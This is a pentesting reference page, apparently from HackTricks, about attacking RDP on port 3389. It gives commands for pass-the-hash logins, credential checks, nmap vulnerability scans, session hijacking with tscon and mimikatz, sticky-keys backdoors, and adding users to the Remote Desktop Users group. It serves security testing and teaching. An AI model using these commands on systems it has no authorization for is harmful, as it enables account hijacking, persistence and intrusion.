# 3389 - Pentesting RDP

## Basic Information

**Remote Desktop** Protocol \(**RDP**\) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs **RDP** client software for this purpose, while the other computer must run **RDP** server software \(from [here](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)\).

**Default port:** 3389

```text
PORT     STATE SERVICE
3389/tcp open  ms-wbt-server
```

## Connect with known credentials/hash

```bash
rdesktop -u <username> <IP>
rdesktop -d <domain> -u <username> -p <password> <IP>
xfreerdp /u:[domain\]<username> /p:<password> /v:<IP>
xfreerdp /u:[domain\]<username> /pth:<hash> /v:<IP>
```

### [Brute force](../brute-force.md#rdp)

**Be careful, you could lock accounts**

## Check known credentials against RDP services

rdp\_check.py from impacket let you check if some credentials are valid for a RDP service:

```bash
rdp_check <domain>/<name>:<password>@<IP>
```

## Nmap scripts

```bash
nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 <IP>
```

It checks the available encryption and DoS vulnerability \(without causing DoS to the service\) and obtains NTLM Windows info \(versions\).

## Post-Exploitation

{% embed url="https://github.com/JoelGMSec/AutoRDPwn" caption="" %}

### Launch CMD with other cretentials so they are used in the network

You can launch a new cmd to wich new credentials will be attached so, every interaction this new shell makes with the network will use the new credentials:

```bash
runas /netonly /user:<DOMAIN>\<NAME> "cmd.exe" #The password will be prompted
```

## Session stealing

With Administrator rights you can access any opened RDP session by any user without need to know the password of the owner.

**Get openned sessions:**

```text
query user
```

**Access to the selected session**

```bash
tscon <ID> /dest:<SESSIONNAME>
```

Now you will be inside the selected RDP session and you will have impersonate a user using only Windows tools and features.

**Important**: When you access an active RDP sessions you will kickoff the user that was using it.

You could get passwords from the process dumping it, but this method is much faster and led you interact with the virtual desktops of the user \(passwords in notepad without been saved in disk, other RDP sessions opened in other machines...\)

#### **Mimikatz**

You could also use mimikatz to do this:

```bash
ts::sessions        #Get sessions
ts::remote /id:2    #Connect to the session
```

#### Sticky-keys & Utilman

Combining this technique with **stickykeys** or **utilman you will be able to access a administrative CMD and any RDP session anytime**

You can search RDPs that have been backdoored with one of these techniques already with: [https://github.com/linuz/Sticky-Keys-Slayer](https://github.com/linuz/Sticky-Keys-Slayer)

## Adding User to RDP group

```bash
net localgroup "Remote Desktop Users" UserLoginName /add
```

## HackTricks Automatic Commands

```text
Protocol_Name: RDP    #Protocol Abbreviation if there is one.
Port_Number:  3389     #Comma separated if there is more than one.
Protocol_Description: Remote Desktop Protocol         #Protocol Abbreviation Spelled out

Name: Notes
Description: Notes for RDP
Note: """
Remote Desktop Protocol (RDP) is a proprietary protocol developed by Microsoft, which provides a user with a graphical interface to connect to another computer over a network connection. The user employs RDP client software for this purpose, while the other computer must run RDP server software 

https://book.hacktricks.xyz/pentesting/pentesting-rdp
"""

Name: Nmap
Description: Nmap with RDP Scripts
Command: """nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 {IP}"""
```

